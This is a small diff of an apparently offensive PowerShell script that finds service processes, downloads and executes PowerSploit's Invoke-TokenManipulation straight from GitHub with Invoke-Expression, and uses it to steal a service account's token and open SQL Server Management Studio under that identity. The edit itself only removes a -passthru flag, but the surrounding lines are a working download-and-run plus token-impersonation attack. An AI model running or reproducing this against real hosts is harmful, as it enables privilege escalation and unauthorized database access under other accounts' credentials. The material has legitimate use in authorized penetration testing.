@@ -16,7 +16,7 @@ ForEach-Object {
         if($s_pathname -like "$p_ExecutablePath"){
             Write-Host "Creating console for service: $s_displayname - Account: $s_serviceaccount"
             Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');
-            Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessArgs '/C ssms.exe' -passthru -ProcessId $p_processid -ErrorAction SilentlyContinue
+            Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessArgs '/C ssms.exe' -ProcessId $p_processid -ErrorAction SilentlyContinue
         }
     }    
 }
